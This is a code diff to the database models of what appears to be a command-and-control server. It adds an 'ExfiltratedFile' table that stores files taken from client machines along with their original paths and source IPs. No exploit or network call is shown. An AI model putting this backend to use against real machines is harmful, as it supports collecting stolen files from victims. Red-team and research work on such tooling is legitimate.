@@ -23,6 +23,7 @@ class Client(db.Model):
     # Relationships
     commands = db.relationship('Command', back_populates='client', cascade='all, delete-orphan')
     results = db.relationship('Result', back_populates='client', cascade='all, delete-orphan')
+    exfiltrated_files = db.relationship('ExfiltratedFile', back_populates='client', cascade='all, delete-orphan')
     
     def to_dict(self):
         """Convert client to dictionary"""
@@ -167,6 +168,38 @@ class Result(db.Model):
             'timestamp': self.timestamp.isoformat(),
             'ip': self.ip
         }
+
+
+class ExfiltratedFile(db.Model):
+    """ExfiltratedFile model - stores exfiltrated files from clients"""
+    __tablename__ = 'exfiltrated_files'
+    
+    id = db.Column(db.Integer, primary_key=True)
+    client_id = db.Column(db.String(255), db.ForeignKey('clients.id'), nullable=False)
+    filename = db.Column(db.String(512), nullable=False)
+    original_path = db.Column(db.Text)
+    file_size = db.Column(db.Integer, nullable=False)
+    content = db.Column(db.Text, nullable=False)  # Base64 encoded file content
+    timestamp = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
+    ip = db.Column(db.String(45), nullable=False)
+    
+    # Relationships
+    client = db.relationship('Client', back_populates='exfiltrated_files')
+    
+    def to_dict(self, include_content=False):
+        """Convert exfiltrated file to dictionary"""
+        result = {
+            'id': self.id,
+            'client_id': self.client_id,
+            'filename': self.filename,
+            'original_path': self.original_path,
+            'file_size': self.file_size,
+            'timestamp': self.timestamp.isoformat(),
+            'ip': self.ip
+        }
+        if include_content:
+            result['content'] = self.content
+        return result
 
 
 def init_db(app):
